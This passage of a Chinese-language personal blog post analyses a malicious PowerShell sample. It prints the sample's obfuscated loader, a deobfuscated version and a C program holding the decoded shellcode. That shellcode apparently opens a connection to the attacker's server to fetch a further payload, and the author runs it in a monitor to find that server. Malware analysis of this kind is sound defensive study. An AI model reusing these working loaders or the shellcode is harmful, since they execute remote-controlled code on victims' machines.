class_">Invoke</span>(<span class="variable">$null</span>, @</span><br><span class="line"><span class="variable">$vUWa37</span>)))), <span class="variable">$gWJz4CZjPH</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function re5ePC &#123;</span><br><span class="line">        <span class="title class_">Param</span> (</span><br><span class="line">                [<span class="title class_">Parameter</span>(<span class="title class_">Position</span> = <span class="number">0</span>, <span class="title class_">Mandatory</span> = <span class="variable">$True</span>)] [<span class="title class_">Type</span>[]] <span class="variable">$s1vaQqXLi</span>,</span><br><span class="line">                [<span class="title class_">Parameter</span>(<span class="title class_">Position</span> = <span class="number">1</span>)] [<span class="title class_">Type</span>] <span class="variable">$glBQxPMwgT</span> = [<span class="title class_">Void</span>]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ze24</span> = [<span class="title class_">AppDomain</span>]::<span class="title class_">CurrentDomain</span>.<span class="title class_">DefineDynamicAssembly</span>((<span class="title class_">New</span>-<span class="title class_">Object</span> <span class="title class_">System</span>.<span class="title class_">Reflection</span>.<span class="title class_">AssemblyName</span>(<span class="string">&#x27;ReflectedD</span></span><br><span class="line"><span class="string">legate&#x27;</span>)), [<span class="title class_">System</span>.<span class="title class_">Reflection</span>.<span class="title class_">Emit</span>.<span class="title class_">AssemblyBuilderAccess</span>]::<span class="title class_">Run</span>).<span class="title class_">DefineDynamicModule</span>(<span class="string">&#x27;InMemoryModule&#x27;</span>, <span class="variable">$false</span>).<span class="title class_">DefineTyp</span></span><br><span class="line">(<span class="string">&#x27;MyDelegateType&#x27;</span>, <span class="string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="title class_">System</span>.<span class="title class_">MulticastDelegate</span>])</span><br><span class="line">        <span class="variable">$ze24</span>.<span class="title class_">DefineConstructor</span>(<span class="string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="title class_">System</span>.<span class="title class_">Reflection</span>.<span class="title class_">CallingConventions</span>]::<span class="title class_">Standard</span>, <span class="variable">$</span></span><br><span class="line"><span class="variable"></span><span class="number">1</span>vaQqXLi).<span class="title class_">SetImplementationFlags</span>(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line">        <span class="variable">$ze24</span>.<span class="title class_">DefineMethod</span>(<span class="string">&#x27;Invoke&#x27;</span>, <span class="string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="variable">$glBQxPMwgT</span>, <span class="variable">$s1vaQqXLi</span>).<span class="title class_">SetImplementationF</span></span><br><span class="line">ags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        return <span class="variable">$ze24</span>.<span class="title class_">CreateType</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="title class_">Byte</span>[]]<span class="variable">$psHJd</span> = [<span class="title class_">System</span>.<span class="title class_">Convert</span>]::<span class="title class_">FromBase64String</span>(<span class="string">&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEIKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaHMctltoAgBlBonmahBWV2iZpXRh/9WFwHQK/04IdezoPwAAAGoAagWV2gC2chf/9WD+AB+6Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH7DAcMpxnXpw7vwtaJWagBT/9U=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$sXMGTPYMkl</span> = [<span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">Marshal</span>]::<span class="title class_">GetDelegateForFunctionPointer</span>((aVNbl kernel32.dll <span class="title class_">VirtualAlloc</span>) (re5ePC @([<span class="title class_">IntPtr</span>], [<span class="title class_">UInt32</span>], [<span class="title class_">UInt32</span>], [<span class="title class_">UInt32</span>]) ([<span class="title class_">IntPtr</span>]))).<span class="title class_">Invoke</span>([<span class="title class_">IntPtr</span>]::<span class="title class_">Zero</span>, <span class="variable">$psHJd</span>.<span class="title class_">Length</span>,<span class="number">0x3000</span>, <span class="number">0x40</span>)[<span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">Marshal</span>]::<span class="title class_">Copy</span>(<span class="variable">$psHJd</span>, <span class="number">0</span>, <span class="variable">$sXMGTPYMkl</span>, <span class="variable">$psHJd</span>.length)</span><br><span class="line"></span><br><span class="line"><span class="variable">$zcLaWjBVTo8P</span> = [<span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">Marshal</span>]::<span class="title class_">GetDelegateForFunctionPointer</span>((aVNbl kernel32.dll <span class="title class_">CreateThrea</span>), (re5ePC @([<span class="title class_">IntPtr</span>], [<span class="title class_">UInt32</span>], [<span class="title class_">IntPtr</span>], [<span class="title class_">IntPtr</span>], [<span class="title class_">UInt32</span>], [<span class="title class_">IntPtr</span>]) ([<span class="title class_">IntPtr</span>]))).<span class="title class_">Invoke</span>([<span class="title class_">IntPtr</span>]::<span class="title class_">Zero</span>,<span class="number">0</span>,<span class="variable">$sXMGTPYMl</span>,[<span class="title class_">IntPtr</span>]::<span class="title class_">Zero</span>,<span class="number">0</span>,[<span class="title class_">IntPtr</span>]::<span class="title class_">Zero</span>)[<span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">Marshal</span>]::<span class="title class_">GetDelegateForFunctionPointer</span>((aVNbl kernel32.dll <span class="title class_">WaitForSingleObject</span>), (re5eC @([<span class="title class_">IntPtr</span>], [<span class="title class_">Int32</span>]))).<span class="title class_">Invoke</span>(<span class="variable">$zcLaWjBVTo8P</span>,<span class="number">0xffffffff</span>) | <span class="title class_">Out</span>-<span class="title class_">Null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看出这明显进行了代码混淆，我们将混淆之后的代码尽可能的还原之后可以得到这样的代码：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun1</span> &#123;</span><br><span class="line">        Param (<span class="variable">$parm1</span>, <span class="variable">$parm2</span>)</span><br><span class="line">        <span class="variable">$parm3</span> = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; <span class="variable">$_.GlobalAssemblyCache</span> -And <span class="variable">$_.Location.Split</span>(<span class="string">&#x27;\\&#x27;</span>)[-<span class="number">1</span>].Equals(<span class="string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$parm3.GetMethod</span>(<span class="string">&#x27;GetProcAddress&#x27;</span>).Invoke(<span class="variable">$null</span>, @([<span class="params">System</span>.Runtime.InteropServices.HandleRef](New-Object <span class="params">System</span>.Runtime.InteropServices.HandleRef((New-Object IntPtr), (<span class="variable">$parm3.GetMethod</span>(<span class="string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="variable">$null</span>, @(<span class="variable">$parm1</span>)))), <span class="variable">$parm2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun2</span> &#123;</span><br><span class="line">        Param (</span><br><span class="line">                [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="variable">$True</span>)] [Type[]] <span class="variable">$parm4</span>,</span><br><span class="line">                [Parameter(Position = <span class="number">1</span>)] [Type] <span class="variable">$parm5</span> = [Void]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="variable">$parm6</span> = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object <span class="params">System</span>.Reflection.AssemblyName(<span class="string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="params">System</span>.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(<span class="string">&#x27;InMemoryModule&#x27;</span>, <span class="variable">$false</span>).DefineType(<span class="string">&#x27;MyDelegateType&#x27;</span>, <span class="string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="params">System</span>.MulticastDelegate])</span><br><span class="line">        <span class="variable">$parm6.DefineConstructor</span>(<span class="string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="params">System</span>.Reflection.CallingConventions]::Standard, <span class="variable">$parm4</span>).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line">        <span class="variable">$parm6.DefineMethod</span>(<span class="string">&#x27;Invoke&#x27;</span>, <span class="string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="variable">$parm5</span>, <span class="variable">$parm4</span>).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$parm6.CreateType</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Byte[]]<span class="variable">$parm7</span> = [<span class="params">System</span>.Convert]::FromBase64String(<span class="string">&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaHMctltoAgBlBonmahBWV2iZpXRh/9WFwHQK/04IdezoPwAAAGoAagRWV2gC2chf/9WD+AB+6Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH7DAcMpxnXpw7vwtaJWagBT/9U=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$parm8</span> = [<span class="params">System</span>.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fun1 kernel32.dll VirtualAlloc),</span><br><span class="line"> (fun2 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="variable">$parm7.Length</span>,<span class="number">0</span>x3000, <span class="number">0</span>x40)</span><br><span class="line">[<span class="params">System</span>.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$parm7</span>, <span class="number">0</span>, <span class="variable">$parm8</span>, <span class="variable">$parm7.length</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$parm9</span> = [<span class="params">System</span>.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fun1 kernel32.dll CreateThread), (fun2 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,<span class="number">0</span>,<span class="variable">$parm8</span>,[IntPtr]::Zero,<span class="number">0</span>,[IntPtr]::Zero)</span><br><span class="line">[<span class="params">System</span>.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fun1 kernel32.dll WaitForSingleObject), (fun2 @([IntPtr], [Int32]))).Invoke(<span class="variable">$parm9</span>,<span class="number">0</span>xffffffff) | Out-Null</span><br></pre></td></tr></table></figure>
+<p>从$parm7可以看出这还是通过base64加密的东西（WTF），所以我们再次通过Base64进行解密还是得到的是乱码所以我们再次仔细观察源码，并没有发现其它端倪，所以我们有理由猜测他是将编译后的二进制指令进行加密之后放到了里面。所以我们将解密之后的东西以16进制输出出来，然后通过程序将二进制指令压入指令栈中，构成一个可以运行的程序。我们可以使用Qt写出类似于下面这样的代码：</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&quot;stdafx.h&quot;</span></span><br><span class="line"><span class="comment">#include&lt;windows.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">char</span> <span class="variable">shellCode</span>[] <span class="operator">=</span></span><br><span class="line"><span class="string">&quot;\xfc\xe8<span class="char escape_">\x82</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x60</span><span class="char escape_">\x89</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xe5<span class="char escape_">\x31</span>\xc0<span class="char escape_">\x64</span>\x8b<span class="char escape_">\x50</span><span class="char escape_">\x30</span>\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x52</span>\x0c\x8b<span class="char escape_">\x52</span><span class="char escape_">\x14</span>\x8b<span class="char escape_">\x72</span><span class="char escape_">\x28</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xb7\x4a<span class="char escape_">\x26</span><span class="char escape_">\x31</span>\xff\xac\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x61</span>\x7c<span class="char escape_">\x02</span>\x2c<span class="char escape_">\x20</span>\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x01</span>\xc7\xe2\xf2<span class="char escape_">\x52</span><span class="char escape_">\x57</span>\x8b<span class="char escape_">\x52</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x10</span>\x8b\x4a\x3c\x8b\x4c<span class="char escape_">\x11</span><span class="char escape_">\x78</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3<span class="char escape_">\x48</span><span class="char escape_">\x01</span>\xd1<span class="char escape_">\x51</span>\x8b<span class="char escape_">\x59</span><span class="char escape_">\x20</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x01</span>\xd3\x8b<span class="char escape_">\x49</span><span class="char escape_">\x18</span>\xe3\x3a<span class="char escape_">\x49</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b<span class="char escape_">\x34</span>\x8b<span class="char escape_">\x01</span>\xd6<span class="char escape_">\x31</span>\xff\xac&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xcf\x0d<span class="char escape_">\x01</span>\xc7<span class="char escape_">\x38</span>\xe0<span class="char escape_">\x75</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xf6<span class="char escape_">\x03</span>\x7d\xf8\x3b\x7d<span class="char escape_">\x24</span><span class="char escape_">\x75</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xe4<span class="char escape_">\x58</span>\x8b<span class="char escape_">\x58</span><span class="char escape_">\x24</span><span class="char escape_">\x01</span>\xd3<span class="char escape_">\x66</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x0c\x4b\x8b<span class="char escape_">\x58</span>\x1c<span class="char escape_">\x01</span>\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b<span class="char escape_">\x04</span>\x8b<span class="char escape_">\x01</span>\xd0<span class="char escape_">\x89</span><span class="char escape_">\x44</span><span class="char escape_">\x24</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x24</span>\x5b\x5b<span class="char escape_">\x61</span><span class="char escape_">\x59</span>\x5a<span class="char escape_">\x51</span>\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x5f\x5f\x5a\x8b<span class="char escape_">\x12</span>\xeb\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x5d<span class="char escape_">\x68</span><span class="char escape_">\x33</span><span class="char escape_">\x32</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x68</span><span class="char escape_">\x77</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x32</span>\x5f<span class="char escape_">\x54</span><span class="char escape_">\x68</span>\x4c<span class="char escape_">\x77</span><span class="char escape_">\x26</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x07</span>\xff\xd5\xb8<span class="char escape_">\x90</span><span class="char escape_">\x01</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x29</span>\xc4<span class="char escape_">\x54</span><span class="char escape_">\x50</span><span class="char escape_">\x68</span><span class="char escape_">\x29</span><span class="char escape_">\x80</span>\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x00</span>\xff\xd5<span class="char escape_">\x50</span><span class="char escape_">\x50</span><span class="char escape_">\x50</span><span class="char escape_">\x50</span><span class="char escape_">\x40</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x50</span><span class="char escape_">\x40</span><span class="char escape_">\x50</span><span class="char escape_">\x68</span>\xea\x0f\xdf\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5<span class="char escape_">\x97</span>\x6a<span class="char escape_">\x05</span><span class="char escape_">\x68</span><span class="char escape_">\x73</span>\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\xb6\x5b<span class="char escape_">\x68</span><span class="char escape_">\x02</span><span class="char escape_">\x00</span><span class="char escape_">\x65</span><span class="char escape_">\x06</span><span class="char escape_">\x89</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x6a<span class="char escape_">\x10</span><span class="char escape_">\x56</span><span class="char escape_">\x57</span><span class="char escape_">\x68</span><span class="char escape_">\x99</span>\xa5&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x74</span><span class="char escape_">\x61</span>\xff\xd5<span class="char escape_">\x85</span>\xc0<span class="char escape_">\x74</span>\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x4e<span class="char escape_">\x08</span><span class="char escape_">\x75</span>\xec\xe8\x3f<span class="char escape_">\x00</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x00</span><span class="char escape_">\x00</span>\x6a<span class="char escape_">\x00</span>\x6a<span class="char escape_">\x04</span><span class="char escape_">\x56</span><span class="char escape_">\x57</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x68</span><span class="char escape_">\x02</span>\xd9\xc8\x5f\xff\xd5<span class="char escape_">\x83</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8<span class="char escape_">\x00</span>\x7e\xe9\x8b<span class="char escape_">\x36</span>\x6a<span class="char escape_">\x40</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x68</span><span class="char escape_">\x00</span><span class="char escape_">\x10</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x56</span>\x6a<span class="char escape_">\x00</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x68</span><span class="char escape_">\x58</span>\xa4<span class="char escape_">\x53</span>\xe5\xff\xd5<span class="char escape_">\x93</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x53</span>\x6a<span class="char escape_">\x00</span><span class="char escape_">\x56</span><span class="char escape_">\x53</span><span class="char escape_">\x57</span><span class="char escape_">\x68</span><span class="char escape_">\x02</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xd9\xc8\x5f\xff\xd5<span class="char escape_">\x83</span>\xf8<span class="char escape_">\x00</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\xc3<span class="char escape_">\x01</span>\xc3<span class="char escape_">\x29</span>\xc6<span class="char escape_">\x75</span>\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\xbb\xf0\xb5\xa2<span class="char escape_">\x56</span>\x6a<span class="char escape_">\x00</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x53</span>\xff\xd5 &quot;</span>;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">main</span>(<span class="params">int</span> <span class="params">argc</span>, <span class="params">char</span>* <span class="params">argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//创建ShellCode的线程</span></span><br><span class="line">    <span class="variable">HANDLE</span> <span class="variable">hThread</span> <span class="operator">=</span> <span class="title class_">CreateThread</span>(<span class="variable">NULL</span>, <span class="number">0</span>, (<span class="variable">LPTHREAD_START_ROUTINE</span>)(int)<span class="operator">&amp;</span><span class="variable">shellCode</span>, <span class="variable">NULL</span>, <span class="number">0</span>, <span class="variable">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待线程的创建完成</span></span><br><span class="line">    <span class="title class_">WaitForSingleObject</span>(<span class="variable">hThread</span>, <span class="variable">INFINITE</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后这段代码肯定要与作者服务器进行通信从而得到恶意的代码，所以我们通过<code>病毒分析工具MyMonitor</code>工具来分析它的Socket通信。<br>将上面编译好的程序拖到分析工具里面，可以看到下面的结果：</p>
+<img title="test" alt="来自七牛云的图片" class="class1 class2" src="http://qiniu.kangqingfei.cn/blog/images/Socket-communication.png">，这样我们就得到了作者的服务器ip和端口，可以发现，如果单纯的下载代码肯定不行，肯定还有一些东西需要从主机上传到作者的服务器，在这里就不去深究了，毕竟自己功底不够，耗时不讨好。所以就到此为止吧，下一步我将好好学习渗透方面的知识，只是为了更好的保护自己的信息安全。想起别人说的一句话：
+<h1 id="冷兵器的时代已经过去，在新的时代我们应该拿起枪和炮，从而才能更好的生存。"><a href="#冷兵器的时代已经过去，在新的时代我们应该拿起枪和炮，从而才能更好的生存。" class="headerlink" title="冷兵器的时代已经过去，在新的时代我们应该拿起枪和炮，从而才能更好的生存。"></a>冷兵器的时代已经过去，在新的时代我们应该拿起枪和炮，从而才能更好的生存。</h1><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://www.evil0x.com/posts/9472.html">使用powershell Client进行有效钓鱼</a></li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/12386">JavaScript Phishing</a></li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/12354">Powershell之MOF后门</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.moonsec.com/post-567.html">执行powerhsell脚本的方法</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/qq1084283172/article/details/45690529">针对中国政府机构的准APT攻击样本Power Shell的ShellCode分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.91ri.org/15506.html">浅谈高级组合技打造“完美” 捆绑后门</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/06/28/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%9C%A8AU%E4%B8%8A%E4%BD%BF%E7%94%A8OpenWrt/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          校园网环境在AU上使用OpenWrt
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/04/26/Qt-Quick-Scene-Graph/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Qt Quick Scene Graph</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+<div class="share">
+	<!-- baidu_share Button BEGIN -->
+	<div class="bdsharebuttonbox">
+   	<a href="#" class="bds_more" data-cmd="more"></a>
+   	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+   	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+   	<a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+   	<a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+   	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+  </div>
+	<script>
+ 	window._bd_share_config={
+ 		"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+ 	</script>
+	<!-- baidu_share Button END -->
+</div>
+
+
+
+
+
+
+
+
+    <style type="text/css">
+    #scroll {
+      display: none;
+    }
+    </style>
+    <div class="scroll">
+    <a href="#" title="返回顶部">T<i class="fa fa-arrow-up"></i></a>
+    <a href="#ds-thread" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部">B<i class="fa fa-arrow-down"></i></a>
+    </div>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2022 kangqingfei
+    	</div>
+    	<div class="footer-right">
+    		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+    	</div>
+    </div>
+    <div class="visit">
+      <span id="site-visit">站点访问量:
+        <span id="busuanzi_value_site_pv"></span> /
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+      <span id="page-visit">, 本页阅读量:
+        <span id="busuanzi_value_page_pv"></span>
+      </span>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部">T<i class="fa fa-arrow-up"></i></a>
+<a href="#footer" title="转到底部">B<i class="fa fa-arrow-down"></i></a>
+</div>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  </div>
+</body>
+</html>
